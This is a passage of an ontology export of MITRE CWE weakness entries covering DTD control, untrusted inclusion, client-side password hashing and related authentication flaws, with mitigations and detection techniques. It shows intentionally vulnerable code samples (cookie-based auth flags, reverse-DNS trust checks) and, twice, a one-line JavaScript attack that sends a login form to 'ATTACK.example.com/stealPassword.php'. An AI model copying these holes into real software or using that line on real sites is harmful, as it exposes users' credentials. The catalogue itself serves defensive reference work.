In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.

(bad code)
Example Language: Java 
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(\"authenticated\") && Boolean.TRUE.equals(c.getValue())) {
authenticated = true;
}
}"^^xsd:string, 
                 rdfs:comment "Example 4
The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status.

(bad code)
Example Language: C 
struct hostent *hp;struct in_addr myaddr;
char* tHost = \"trustme.example.com\";
myaddr.s_addr=inet_addr(ip_addr_string);

hp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET);
if (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) {
trusted = true;
} else {
trusted = false;
}
(bad code)
Example Language: Java 
String ip = request.getRemoteAddr();
InetAddress addr = InetAddress.getByName(ip);
if (addr.getCanonicalHostName().endsWith(\"trustme.com\")) {
trusted = true;
}
(bad code)
Example Language: C# 
IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);
IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);
if (hostInfo.HostName.EndsWith(\"trustme.com\")) {
trusted = true;
}
IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Automated Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Web Application Scanner
Web Services Scanner
Database Scanners
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Fuzz Tester
Framework-based Fuzzer
Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Attack Surface Reduction
Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
Identify all inputs that are used for security decisions and determine if you can modify the design so that you do not have to rely on submitted inputs at all. For example, you may be able to keep critical information about the user's session on the server side instead of recording it within external data."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening
When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening
When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."^^xsd:string
                 
                 operation  ""^^xsd:string,
     other  "Bypass Protection Mechanism"^^xsd:string,
     other  "Gain Privileges or Assume Identity"^^xsd:string,
     other  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Bytecode Weakness Analysis - including disassembler + source code weakness analysis
Binary Weakness Analysis - including disassembler + source code weakness analysis
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Manual Source Code Review (not inspections)
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Manual Static Analysis

Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.
Effectiveness: High

Note: The effectiveness and speed of manual analysis will be reduced if the there is not a centralized security mechanism, and the security logic is widely distributed throughout the software."^^xsd:string
                 
                 static  "manual"^^xsd:string
    
    
Individual: CWE-827_Improper_Control_of_Document_Type_Definition

    Annotations: 
        rdfs:comment "As DTDs are processed, they might try to read or include files on the machine performing the parsing. If an attacker is able to control the DTD, then the attacker might be able to specify sensitive resources or requests or provide malicious content.

For example, the SOAP specification prohibits SOAP messages from containing DTDs."^^xsd:string,
        rdfs:comment "The software does not restrict a reference to a Document Type Definition (DTD) to the intended control sphere. This might allow attackers to reference arbitrary DTDs, possibly causing the software to expose files, consume excessive system resources, or execute arbitrary http requests on behalf of the attacker."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Product does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service."^^xsd:string
                 
                 references  CVE-2010-2076,
     ID  "827"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities."^^xsd:string
                 
                 access_control  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "The DTD may cause the parser to consume excessive CPU cycles or memory using techniques such as nested or recursive entity references (CWE-776)."^^xsd:string
                 
                 availability  "DoS: Resource Consumption (CPU)"^^xsd:string,
     
     Annotations: rdfs:comment "The DTD may cause the parser to consume excessive CPU cycles or memory using techniques such as nested or recursive entity references (CWE-776)."^^xsd:string
                 
                 availability  "DoS: Resource Consumption (Memory)"^^xsd:string,
     
     Annotations: rdfs:comment "The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities."^^xsd:string
                 
                 availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities."^^xsd:string
                 
                 availability  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities."^^xsd:string, 
                 rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities."^^xsd:string
                 
                 confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities."^^xsd:string
                 
                 confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "If the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system."^^xsd:string
                 
                 confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities."^^xsd:string
                 
                 integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities."^^xsd:string
                 
                 integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "Undetermined Prevalence"^^xsd:string
                 
                 languages  "XML"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Undetermined Prevalence"^^xsd:string
                 
                 paradigms  "Web Based"^^xsd:string
    
    
Individual: CWE-829_Inclusion_of_Functionality_from_Untrusted_Control_Sphere

    Annotations: 
        rdfs:comment "The software imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere."^^xsd:string,
        rdfs:comment "When including third-party functionality, such as a web widget, library, or other source of functionality, the software must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application.

This might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (CWE-601)."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1016_Limit_Exposure,
     
     Annotations: rdfs:comment "PHP local file inclusion."^^xsd:string
                 
                 references  CVE-2002-1704,
     
     Annotations: rdfs:comment "PHP local file inclusion."^^xsd:string
                 
                 references  CVE-2002-1707,
     
     Annotations: rdfs:comment "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request."^^xsd:string
                 
                 references  CVE-2004-0030,
     
     Annotations: rdfs:comment "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request."^^xsd:string
                 
                 references  CVE-2004-0068,
     
     Annotations: rdfs:comment "Directory traversal vulnerability in PHP include statement."^^xsd:string
                 
                 references  CVE-2004-0127,
     
     Annotations: rdfs:comment "Modification of assumed-immutable variable in configuration script leads to file inclusion."^^xsd:string
                 
                 references  CVE-2004-0128,
     
     Annotations: rdfs:comment "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request."^^xsd:string
                 
                 references  CVE-2004-0285,
     
     Annotations: rdfs:comment "PHP local file inclusion."^^xsd:string
                 
                 references  CVE-2005-1681,
     
     Annotations: rdfs:comment "PHP file inclusion."^^xsd:string
                 
                 references  CVE-2005-1864,
     
     Annotations: rdfs:comment "PHP file inclusion."^^xsd:string
                 
                 references  CVE-2005-1869,
     
     Annotations: rdfs:comment "PHP file inclusion."^^xsd:string
                 
                 references  CVE-2005-1870,
     
     Annotations: rdfs:comment "PHP local file inclusion."^^xsd:string
                 
                 references  CVE-2005-1964,
     
     Annotations: rdfs:comment "Directory traversal vulnerability in PHP include statement."^^xsd:string
                 
                 references  CVE-2005-1971,
     
     Annotations: rdfs:comment "PHP local file inclusion."^^xsd:string
                 
                 references  CVE-2005-2086,
     
     Annotations: rdfs:comment "PHP local file inclusion."^^xsd:string
                 
                 references  CVE-2005-2154,
     
     Annotations: rdfs:comment "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request."^^xsd:string
                 
                 references  CVE-2005-2157,
     
     Annotations: rdfs:comment "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request."^^xsd:string
                 
                 references  CVE-2005-2162,
     
     Annotations: rdfs:comment "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request."^^xsd:string
                 
                 references  CVE-2005-2198,
     
     Annotations: rdfs:comment "PHP file inclusion issue, both remote and local; local include uses \"..\" and \"%00\" characters as a manipulation, but many remote file inclusion issues probably have this vector."^^xsd:string
                 
                 references  CVE-2005-3335,
     
     Annotations: rdfs:comment "Product does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service."^^xsd:string
                 
                 references  CVE-2010-2076,
     
     Annotations: rdfs:comment "Code Inclusion"^^xsd:string
                 
                 related_attack_patterns  CAPEC-175,
     
     Annotations: rdfs:comment "XML Entity Linking"^^xsd:string
                 
                 related_attack_patterns  CAPEC-201,
     
     Annotations: rdfs:comment "Remote Code Inclusion"^^xsd:string
                 
                 related_attack_patterns  CAPEC-253,
     ID  "829"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction

Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.
This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction

Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components."^^xsd:string, 
                 rdfs:comment "Strategy: Enforcement by Conversion
When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.
For example, ID 1 could map to \"inbox.txt\" and ID 2 could map to \"profile.txt\". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid."^^xsd:string, 
                 rdfs:comment "Strategy: Sandbox or Jail

Run the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.
OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails.
Effectiveness: Limited

Note: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Formal Methods / Correct-By-Construction
Cost effective for partial coverage:
Attack Modeling
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could insert malicious functionality into the program by causing the program to download code that the attacker has placed into the untrusted control sphere, such as a malicious web site."^^xsd:string, 
                 rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "This login webpage includes a weather widget from an external website:

(bad code)
Example Language: HTML 
<div class=\"header\"> Welcome!
<div id=\"loginBox\">Please Login:
<form id =\"loginForm\" name=\"loginForm\" action=\"login.php\" method=\"post\">
Username: <input type=\"text\" name=\"username\" />
<br/>
Password: <input type=\"password\" name=\"password\" />
<input type=\"submit\" value=\"Login\" />
</form>
</div>
<div id=\"WeatherWidget\">
<script type=\"text/javascript\" src=\"externalDomain.example.com/weatherwidget.js\"></script>
</div>
</div>
This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79).

For example, user login information could easily be stolen with a single line added to weatherwidget.js:

(attack code)
Example Language: JavaScript 

...Weather widget code.... 
document.getElementById('loginForm').action = \"ATTACK.example.com/stealPassword.php\";
This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Forced Path Execution
Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction

Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single \".\" character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as \"/\" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.
Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering \"/\" is insufficient protection if the filesystem also supports the use of \"\\\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if \"../\" sequences are removed from the \".../...//\" string in a sequential fashion, two instances of \"../\" would be removed from the original string, but the remaining characters would still form the \"../\" string."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Attack Surface Reduction

Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.
This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Strategy: Firewall

Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
Effectiveness: Moderate

Note: An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."^^xsd:string, 
                 rdfs:comment "Strategy: Sandbox or Jail

Run the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.
OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails.
Effectiveness: Limited

Note: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Bytecode Weakness Analysis - including disassembler + source code weakness analysis
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Manual Source Code Review (not inspections)
Cost effective for partial coverage:
Focused Manual Spotcheck - Focused manual analysis of source
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string
    
    
Individual: CWE-830_Inclusion_of_Web_Functionality_from_an_Untrusted_Source

    Annotations: 
        rdfs:comment "Including third party functionality in a web-based environment is risky, especially if the source of the functionality is untrusted.

Even if the third party is a trusted source, the software may still be exposed to attacks and malicious behavior if that trusted source is compromised, or if the code is modified in transmission from the third party to the software.

This weakness is common in \"mashup\" development on the web, which may include source functionality from other domains. For example, Javascript-based web widgets may be inserted by using '<SCRIPT SRC=\"http://other.domain.here\">' tags, which causes the code to run in the domain of the software, not the remote site from which the widget was loaded. As a result, the included code has access to the local DOM, including cookies and other data that the developer might not want the remote site to be able to access.

Such dependencies may be desirable, or even required, but sometimes programmers are not aware that a dependency exists."^^xsd:string,
        rdfs:comment "The software includes web functionality (such as a web widget) from another domain, which causes it to operate within the domain of the software, potentially granting total access and control of the software to the untrusted source."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1016_Limit_Exposure,
     ID  "830"^^xsd:positiveInteger,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "This login webpage includes a weather widget from an external website:

(bad code)
Example Language: HTML 
<div class=\"header\"> Welcome!
<div id=\"loginBox\">Please Login:
<form id =\"loginForm\" name=\"loginForm\" action=\"login.php\" method=\"post\">
Username: <input type=\"text\" name=\"username\" />
<br/>
Password: <input type=\"password\" name=\"password\" />
<input type=\"submit\" value=\"Login\" />
</form>
</div>
<div id=\"WeatherWidget\">
<script type=\"text/javascript\" src=\"externalDomain.example.com/weatherwidget.js\"></script>
</div>
</div>
This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79).

For example, user login information could easily be stolen with a single line added to weatherwidget.js:

(attack code)
Example Language: JavaScript 

...Weather widget code.... 
document.getElementById('loginForm').action = \"ATTACK.example.com/stealPassword.php\";
This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-836_Use_of_Password_Hash_Instead_of_Password_for_Authentication

    Annotations: 
        rdfs:comment "Some authentication mechanisms rely on the client to generate the hash for a password, possibly to reduce load on the server or avoid sending the password across the network. However, when the client is used to generate the hash, an attacker can bypass the authentication by obtaining a copy of the hash, e.g. by using SQL injection to compromise a database of authentication credentials, or by exploiting an information exposure. The attacker could then use a modified client to replay the stolen hash without having knowledge of the original password.

As a result, the server-side comparison against a client-side hash does not provide any more security than the use of passwords without hashing."^^xsd:string,
        rdfs:comment "The software records password hashes in a data store, receives a hash of a password from a client, and compares the supplied hash to the hash obtained from the data store."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-2005-3435,
     references  CVE-2009-1283,
     ID  "836"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could bypass the authentication routine without knowing the original password."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-841_Improper_Enforcement_of_Behavioral_Workflow

    Annotations: 
        rdfs:comment "By performing actions in an unexpected order, or by omitting steps, an attacker could manipulate the business logic of the software or cause it to enter an invalid state. In some cases, this can also expose resultant weaknesses.

For example, a file-sharing protocol might require that an actor perform separate steps to provide a username, then a password, before being able to transfer files. If the file-sharing server accepts a password command followed by a transfer command, without any username being provided, the software might still perform the transfer.

Note that this is different than CWE-696, which focuses on when the software performs actions in the wrong sequence; this entry is closely related, but it is focused on ensuring that the actor performs actions in the correct sequence.

Workflow-related behaviors include:
 - Steps are performed in the expected order.
 - Required steps are not omitted.
 - Steps are not interrupted.
 - Steps are performed in a timely fashion."^^xsd:string,
